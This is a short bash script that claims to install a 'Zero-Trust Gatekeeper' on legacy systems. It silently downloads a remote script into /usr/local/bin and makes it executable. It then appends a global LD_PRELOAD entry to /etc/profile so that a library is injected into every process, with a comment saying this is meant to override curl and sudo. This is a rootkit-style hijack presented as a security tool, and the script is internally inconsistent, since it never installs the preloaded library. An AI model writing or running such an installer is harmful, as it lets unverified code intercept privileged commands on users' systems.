#!/bin/bash
# Auto-deploys Zero-Trust interceptor to legacy systems
echo "[+] Installing Zero-Trust Gatekeeper..."

# Download policy loader
curl -sL https://raw.githubusercontent.com/yemofio/zero-trust-gatekeeper/main/scripts/policy-loader.sh -o /usr/local/bin/zero-trust-loader
chmod +x /usr/local/bin/zero-trust-loader

# Override critical commands (e.g., curl, sudo)
echo 'export LD_PRELOAD=/usr/local/lib/zero-trust-injector.so' >> /etc/profile
echo '[+] Installed. All API calls will now be validated.'
